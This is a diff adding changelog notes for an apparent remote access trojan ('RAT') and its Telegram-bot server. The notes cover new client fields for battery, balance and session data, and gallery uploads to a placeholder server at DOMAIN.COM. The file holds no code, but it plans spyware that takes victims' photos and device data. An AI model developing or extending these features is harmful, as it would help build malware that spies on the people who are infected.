@@ -1,0 +1,17 @@
+### Rat Developer READ THIS
++ added a *must* field 'session_id'
++ added a *must* field 'battery'
++ added an *optional* field 'balance'
++ added gallery options, upload one after other into https://DOMAIN.COM/g (requires only id and session_id in body)
+
+### Server Developer READ THIS
++ moved from telegraf to GrammY
++ change client information in high priority
++ keep socket alive
++ added gallery
++ added sessions
++ performed messages
++ added help message
++ added mask name handling
++ from socket to ws
+
